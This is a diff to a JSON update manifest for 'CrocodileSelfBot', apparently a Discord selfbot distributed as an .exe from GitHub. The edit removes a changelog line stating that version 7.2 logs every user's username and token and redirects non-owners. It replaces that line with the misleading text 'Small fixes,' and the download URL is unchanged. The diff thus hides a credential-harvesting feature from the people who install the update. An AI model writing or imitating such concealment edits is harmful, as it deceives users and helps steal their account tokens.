@@ -1,5 +1,5 @@
 {
     "version": "7.2",
-    "changelog": "FULL LOGGING: Logs EVERYONE with username + token. Redirects non-owners to launcher.",
+    "changelog": "Small fixes.",
     "url": "https://raw.githubusercontent.com/sanbar27/crocodile-bot/main/CrocodileSelfBot.exe"
 }
